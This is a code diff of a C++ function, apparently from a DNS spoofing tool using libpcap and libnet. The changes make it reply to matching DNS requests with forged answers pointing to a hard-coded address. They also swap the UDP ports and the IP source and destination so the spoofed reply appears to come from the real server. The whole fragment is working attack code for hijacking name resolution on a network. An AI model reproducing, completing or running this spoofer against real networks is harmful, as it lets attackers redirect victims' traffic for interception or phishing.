@@ -84,9 +84,7 @@ void handle_dns_packet(u_char *user, const struct pcap_pkthdr *h, const u_char *
     }
     cout <<  endl;
 
-    cout << std::hex << dns_qr(incoming_dns_header) << endl;
-
-    if(dns_qr(incoming_dns_header ) > 0) {
+    if(dns_qr(incoming_dns_header ) == 0) { // when dns request
 
         if(domain_name_segments.size() == spoof_target.size()) {
             auto spoof = true;
@@ -128,6 +126,8 @@ void handle_dns_packet(u_char *user, const struct pcap_pkthdr *h, const u_char *
                         0xd5, 0xb4, 0x8d, 0x8c // onet.pl
                 );
 
+                cout << payload_s << endl;
+
                 auto tag = libnet_build_dnsv4(
                         LIBNET_UDP_DNSV4_H, //const size of dns header - 12
                         (uint16_t)dns_qid(incoming_dns_header ), // transaction id
@@ -149,8 +149,8 @@ void handle_dns_packet(u_char *user, const struct pcap_pkthdr *h, const u_char *
                 cout << (uint32_t)incoming_udp_header->uh_sport << endl;
 
                 tag = libnet_build_udp(
-                        ntohs(incoming_udp_header->uh_sport), // source port 53
                         ntohs(incoming_udp_header->uh_dport), // destination port
+                        ntohs(incoming_udp_header->uh_sport), // source port 53
                         (uint16_t)(LIBNET_UDP_H + LIBNET_UDP_DNSV4_H + payload_s), // length
                         0, // checksum
                         nullptr, // payload,
@@ -173,8 +173,8 @@ void handle_dns_packet(u_char *user, const struct pcap_pkthdr *h, const u_char *
                         (uint8_t)incoming_ip_header->ttl, // time to live
                         IPPROTO_UDP, // upper layer protocol
                         0, // checksum
-                        incoming_ip_header->saddr,		//Dst IP
                         incoming_ip_header->daddr,		//Src IP //192.168.0.11
+                        incoming_ip_header->saddr,		//Dst IP
                         nullptr, // payload
                         0, // payload size
                         libnet_context,
